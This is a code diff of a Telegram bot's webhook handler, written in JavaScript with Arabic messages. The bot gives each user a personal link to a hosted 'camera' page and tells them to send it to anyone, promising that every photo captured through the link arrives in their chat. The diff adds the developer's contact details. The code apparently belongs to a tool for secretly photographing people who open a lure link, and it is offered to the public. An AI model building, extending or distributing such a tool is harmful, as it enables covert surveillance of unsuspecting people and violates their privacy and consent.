@@ -1,6 +1,5 @@
 // api/webhook.js — VANTA for WORM
 // منطق بوت @Saleckbz_cam_bot
-// كل مستخدم يحصل على رابطه الخاص — بدون رموز
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -50,24 +49,26 @@ export default async function handler(req, res) {
   // ============ /start ============
   if (text === '/start' || text === '/help') {
 
-    // رابط المستخدم الخاص (Chat ID داخله)
     const link = 'https://camera-one-henna.vercel.app/t/' + chatId;
 
-    // 1) رد للمستخدم
+    // 1) رد للمستخدم — يظهر حسابك + رابطه الخاص
     await send(chatId,
       '👋 أهلاً ' + name + '!\n\n' +
-      '🎁 هذا <b>رابطك الخاص</b>:\n\n' +
+      '👨‍💻 هذا حساب المبرمج:\n' +
+      '<a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>\n\n' +
+      '🎁 وهذا <b>رابطك الخاص</b>:\n\n' +
       '<code>' + link + '</code>\n\n' +
       '📸 أرسل هذا الرابط لأي شخص.\n' +
       'كل صورة تُلتقط عبره <b>ستصلك هنا</b>.',
       {
-        inline_keyboard: [[
-          { text: '📋 نسخ رابطي', url: link }
-        ]]
+        inline_keyboard: [
+          [{ text: '💬 تواصل مع المبرمج', url: 'https://t.me/' + OWNER_TG }],
+          [{ text: '📋 نسخ رابطي', url: link }]
+        ]
       }
     );
 
-    // 2) إشعار للمالك
+    // 2) إشعار لك (المالك) بكل مستخدم جديد
     if (OWNER_CHAT && String(OWNER_CHAT) !== String(chatId)) {
       await send(OWNER_CHAT,
         '🔔 <b>مستخدم جديد</b>\n\n' +
@@ -85,13 +86,15 @@ export default async function handler(req, res) {
   // أي رسالة أخرى — أعد إرسال الرابط
   const link = 'https://camera-one-henna.vercel.app/t/' + chatId;
   await send(chatId,
+    '👨‍💻 حساب المبرمج:\n<a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>\n\n' +
     '🔗 رابطك الخاص:\n\n<code>' + link + '</code>',
     {
-      inline_keyboard: [[
-        { text: '📋 نسخ رابطي', url: link }
-      ]]
+      inline_keyboard: [
+        [{ text: '💬 تواصل مع المبرمج', url: 'https://t.me/' + OWNER_TG }],
+        [{ text: '📋 نسخ رابطي', url: link }]
+      ]
     }
   );
 
   res.status(200).send('OK');
-          }
+}
